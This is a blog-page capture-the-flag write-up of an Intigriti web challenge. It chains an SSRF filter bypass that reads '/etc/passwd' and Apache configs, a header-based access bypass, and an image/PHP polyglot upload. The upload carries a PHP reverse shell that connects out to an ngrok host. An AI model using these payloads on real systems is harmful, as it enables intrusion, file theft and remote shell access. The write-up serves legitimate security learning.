<!DOCTYPE html>
<html lang="en-us" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=34081&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>Intigriti - October Challenge Writeup | Yours, Sto ʚɞ</title>

    <link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">

      <script src="/js/main.js"></script>


</head>
<body>
  <header>
    <div class="content-list"></div>
<h2>Yours, Sto ʚɞ</h2>

  <nav>
    <ul>
    <li>
      <a href="/">Home</a>
    </li>
    <li>
      <a aria-current="true" class="ancestor" href="/posts/">Posts</a>
    </li>
    <li>
      <a href="/tags/">Tags</a>
    </li>
    </ul>
  </nav>

</div>

  </header>
  <main>
    
  <h1>Intigriti - October Challenge Writeup</h1>
  <div class="content">
    
  <div>
    <div>Tags:</div>
    <ul>
        <li><a href="/tags/ssrf/">SSRF</a></li>
        <li><a href="/tags/lfi/">LFI</a></li>
        <li><a href="/tags/rce/">RCE</a></li>
    </ul>
  </div>

    
    <div>
      <h2 id="description">Description</h2>
<p>Intigriti&rsquo;s October challenge was a really cool challenge, leveraging SSRF, local file inclusion, and RCE. I first found the flag in an unintended manner, and then worked my way into finding the RCE, popping that shell and flagging again ^.^</p>
<h2 id="unintended-solution">Unintended Solution</h2>
<p>My solution was the following :</p>
<p>We first have a panel to input a &ldquo;URL&rdquo; of an image that would be fetched. The first idea that comes to one&rsquo;s mind upon seeing this is : <strong>Server Side Request Forgery (SSRF)</strong>. I first set the input to <code>file:///etc/passwd</code>, but obtained the error <code>Invalid URL: must include 'http'</code></p>
<p><img src="image.png" alt="alt text"></p>
<p>Hence, I tried using <code>file:///etc/passwd?http</code> and this yielded the content of <code>/etc/passwd</code>, so the SSRF worked perfectly.</p>
<p><img src="image-1.png" alt="alt text"></p>
<p>Using this, I explored the file system looking for the flag, and used the input <code>file:///?http</code> to list the content of the <code>/</code> directory.</p>
<p><img src="image-2.png" alt="alt text">
There, I saw a file with a random name, the <code>93e892fe-c0af-44a1-9308-5a58548abd98.txt</code>, and when fetching its content using the input <code>file:///93e892fe-c0af-44a1-9308-5a58548abd98.txt?http</code>, we got the flag : <strong>INTIGRITI{ngks896sdjvsjnv6383utbgn}</strong></p>
<p><img src="image-3.png" alt="alt text"></p>
<p>But as the challenge requirements mentioned the necessity of leveraging an RCE, we are not finished yet.</p>
<h2 id="real-solution">Real Solution</h2>
<p>Our goal is to pop a shell, so let&rsquo;s proceed to achieving that.</p>
<p>We first inspect the files in the current directory using the input <code>file:///proc/self/cwd/?http</code>. We obtain five files as underlined in the screenshot below :</p>
<p><img src="image-4.png" alt="alt text"></p>
<p>Upon inspection, the one that might be the most interesting in our case is the <code>upload_shoppix_images.php</code>, as it allows uploading files to the server given the following code :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
</span></span><span style="display:flex;"><span>        $file <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;image&#39;</span>];
</span></span><span style="display:flex;"><span>        $filename <span style="color:#f92672">=</span> $file[<span style="color:#e6db74">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>        $tmp <span style="color:#f92672">=</span> $file[<span style="color:#e6db74">&#39;tmp_name&#39;</span>];
</span></span><span style="display:flex;"><span>        $mime <span style="color:#f92672">=</span> <span style="color:#a6e22e">mime_content_type</span>($tmp);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">strpos</span>($mime, <span style="color:#e6db74">&#34;image/&#34;</span>) <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>            (<span style="color:#a6e22e">stripos</span>($filename, <span style="color:#e6db74">&#34;.png&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">stripos</span>($filename, <span style="color:#e6db74">&#34;.jpg&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">stripos</span>($filename, <span style="color:#e6db74">&#34;.jpeg&#34;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>)
</span></span><span style="display:flex;"><span>        ) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">move_uploaded_file</span>($tmp, <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">basename</span>($filename));
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p style=&#39;color:#00e676&#39;&gt;✅ File uploaded successfully to /uploads/ directory!&lt;/p&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p style=&#39;color:#ff5252&#39;&gt;❌ Invalid file format&lt;/p&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Nevertheless, when trying to access it via <code>https://challenge-1025.intigriti.io/upload_shoppix_images.php</code>, we obtain a 403 Forbidden error.</p>
<p>Hence, let&rsquo;s check the Apache configuration to see how the server actually works. We first check the file <code>/etc/apache2/apache2.conf</code> by setting the input to <code>file:///etc/apache2/apache2.conf?http</code>, and we observe that it includes the configurations in the directory <code>sites-enabled</code> given these lines :</p>
<pre tabindex="0"><code># Include the virtual host configurations:
IncludeOptional sites-enabled/*.conf
</code></pre><p>We check the content of that directory and observe that there is only one configuration file <code>000-default.conf</code>.</p>
<p><img src="image-5.png" alt="alt text"></p>
<p>Let&rsquo;s check its content.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:8080</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    DocumentRoot /var/www/html
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Directory</span> <span style="color:#960050;background-color:#1e0010">/var/www/html</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        Options Indexes FollowSymLinks
</span></span><span style="display:flex;"><span>        AllowOverride All
</span></span><span style="display:flex;"><span>        Require all granted
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/Directory&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Directory</span> <span style="color:#960050;background-color:#1e0010">/var/www/html/uploads</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        Options -Indexes
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/Directory&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Directory</span> <span style="color:#960050;background-color:#1e0010">/var/www/html/public</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        Options -Indexes
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/Directory&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Files</span> <span style="color:#960050;background-color:#1e0010">&#34;upload_shoppix_images.php&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;If</span> <span style="color:#960050;background-color:#1e0010">&#34;%{HTTP:is-shoppix-admin}</span> <span style="color:#960050;background-color:#1e0010">!=</span> <span style="color:#960050;background-color:#1e0010">&#39;true&#39;&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>            Require all denied
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/If&gt;</span>
</span></span><span style="display:flex;"><span>        Require all granted
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/Files&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/VirtualHost&gt;</span>
</span></span></code></pre></div><p>Given the rule :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;Files</span> <span style="color:#960050;background-color:#1e0010">&#34;upload_shoppix_images.php&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;If</span> <span style="color:#960050;background-color:#1e0010">&#34;%{HTTP:is-shoppix-admin}</span> <span style="color:#960050;background-color:#1e0010">!=</span> <span style="color:#960050;background-color:#1e0010">&#39;true&#39;&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        Require all denied
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/If&gt;</span>
</span></span><span style="display:flex;"><span>    Require all granted
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Files&gt;</span>
</span></span></code></pre></div><p>we should be able to access <code>https://challenge-1025.intigriti.io/upload_shoppix_images.php</code> by setting a header <code>is-shoppix-admin: true</code> in our request <code>is-Shoppix-Admin: true</code>. Upon testing, this proves to give us the webpage we want.</p>
<p><img src="image-7.png" alt="alt text"></p>
<p><img src="image-6.png" alt="alt text"></p>
<p>Our goal now is to upload a reverse shell in the application, nevertheless, we need to upload a file that verifies these conditions :</p>
<pre tabindex="0"><code>strpos($mime, &#34;image/&#34;) === 0 &amp;&amp;
(stripos($filename, &#34;.png&#34;) !== false ||
stripos($filename, &#34;.jpg&#34;) !== false ||
stripos($filename, &#34;.jpeg&#34;) !== false)
</code></pre><p>so basically, we need to upload a file such that :</p>
<ul>
<li>The MIME type starts with <code>image/</code></li>
<li>The filename contains <code>.png</code>, <code>.jpg</code>, or <code>.jpeg</code> (case-insensitive)</li>
</ul>
<p>To do so, we can just create a 1*1 JPG, append our PHP code to it and upload it to the server. Upon accessing it directly in the <code>/uploads</code>, our code will be executed and we will obtain our shell. Let&rsquo;s do that.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>We create the 1*1 JPG using the following bash oneliner :</li>
</ul>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<ul>
<li>We create our reverse shell in <code>test.php</code> :</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span>$sock<span style="color:#f92672">=</span><span style="color:#a6e22e">fsockopen</span>(<span style="color:#e6db74">&#34;6.tcp.eu.ngrok.io&#34;</span>,<span style="color:#ae81ff">11347</span>);$proc<span style="color:#f92672">=</span><span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">1</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">2</span><span style="color:#f92672">=&gt;</span>$sock),$pipes); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ul>
<li>We concatenate both files in a final one <code>test.jpg.php</code> and upload the latter to the server:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat tiny.jpg test.php &gt; test.jpg.php
</span></span><span style="display:flex;"><span>curl -X POST -F <span style="color:#e6db74">&#34;image=@test.jpg.php&#34;</span> -H <span style="color:#e6db74">&#34;is-shoppix-admin: true&#34;</span> https://challenge-1025.intigriti.io/upload_shoppix_images.php
</span></span></code></pre></div><p>We obtain a response containing : <code>&lt;p style='color:#00e676'&gt;✅ File uploaded successfully to /uploads/ directory!&lt;/p&gt;  &lt;/div&gt;</code>. Hence, our file was successfully uploaded. Let&rsquo;s check it on <code>https://challenge-1025.intigriti.io/uploads/test.jpg.php</code> in the browser.
Once we do that, we successfully receive the connexion back and obtain our shell.</p>
<ul>
<li>FInally, we just need to find the flag as we showcase in the screenshot below :
<img src="flag.png" alt="alt text"></li>
</ul>
<p>Again, our flag is <strong>INTIGRITI{ngks896sdjvsjnv6383utbgn}</strong></p>

    </div>

  </div>


  </main>
  <footer>
    <p>01011001 01101111 01110101 01110010 01110011 00101100 00100000 01010011 01110100 01101111</p>

  </footer>
</body>
</html>
